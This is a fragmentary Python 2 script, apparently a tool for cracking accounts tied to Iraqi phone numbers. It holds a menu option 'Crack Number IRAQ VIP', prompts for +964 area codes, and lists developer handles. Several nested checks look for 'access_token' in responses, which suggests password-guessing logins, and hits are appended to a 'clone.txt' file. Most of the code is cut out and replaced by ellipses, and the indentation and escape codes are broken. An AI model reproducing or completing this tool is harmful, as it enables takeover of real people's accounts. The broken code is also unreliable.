...
def menu():
    ...
    print '\x1b[1;92m[1]\x1b[1;92m Crack Number IRAQ VIP'
...
def action():
    global cpb
    global oks
    bch = raw_input('Halbzhera Dlm>>: ')
    if bch == '':
        print 'Ended the free period Russell developer to activate'
        print 'Developers ID'
        print '@kurdhacker_hama_bn_dlaj @mohamad_najm_aldin'
        action()
    elif bch == '1999':
        ...
        os.system("figlet KURDO")
     	print("\031[60;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\031[0;1m")
     	print '\031[32m 770 - 771 - 772 - 773 - 774\n  750 - 751 - 752 - 753 - 754\n   780 - 781 - 782 - 783 - 784\033[0;1m\n\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m'
     	try:
     	    k = '+964'
            c = raw_input('\033[90;1m Choose Area Code : ')
            idlist = '.txt'
        ...
        action()
    xxx = str(len(id))
    psb('\033[31m Total Numbers .txt: ' + xxx)
    print '\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;96m##\x1b[1;90mCODER\x1b[1;96m>>\x1b[1;90mMATIN-CRACKER'
                        ...
                        if 'access_token' in q:
                            ...
                            if 'access_token' in q:
                                ...
                                if 'access_token' in q:
                                    ...
                                    print '\x1b[1;96m##\x1b[1;90CODER\x1b[1;96m>>\x1b[1;90mMATIN-CRACKER'
                                    print '\x1b[1;94m_____________________________________________'
                                    okb = open('anggaxd/clone.txt', 'a')
